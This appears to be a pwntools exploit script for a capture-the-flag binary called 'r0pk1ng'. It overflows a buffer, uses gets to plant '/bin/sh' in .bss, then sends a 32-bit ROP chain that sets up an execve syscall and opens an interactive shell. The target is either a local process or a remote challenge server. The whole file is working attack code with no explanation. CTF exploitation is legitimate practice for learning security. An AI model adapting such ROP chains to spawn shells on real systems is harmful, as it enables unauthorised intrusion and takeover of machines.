import pwn
# pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.context.binary = pwn.ELF("./r0pk1ng")

if pwn.args.GDB:
    p = elf.process()
    p_gdb = pwn.gdb.attach(p, '''b *vuln\nc''')
elif pwn.args.REMOTE:
    p = pwn.remote("gc1.eng.run", 32459)
else:
    p = pwn.process(elf.path)
pop_eax = 0x0804925e
pop_ebx = 0x08049022
pop_ecx = 0x08049262
bss = 0x804c020
pop_edx = 0x08049264
syscall = 0x08049266
payload = b'A'*0x20
payload += b'B'*4
payload += pwn.p32(elf.plt['gets'])
payload += pwn.p32(elf.sym.main)
payload += pwn.p32(bss)

payload2 = b'A'*0x20
payload2 += b'B'*0x4
payload2 += pwn.p32(pop_eax)
payload2 += pwn.p32(0xb)
payload2 += pwn.p32(pop_ebx)
payload2 += pwn.p32(bss)
payload2 += pwn.p32(pop_ecx)
payload2 += pwn.p32(0x0)
payload2 += pwn.p32(pop_edx)
payload2 += pwn.p32(0x0)
payload2 += pwn.p32(syscall)
p.sendline(payload)
p.sendline(b'/bin/sh\0')
p.sendline(payload2)
p.interactive()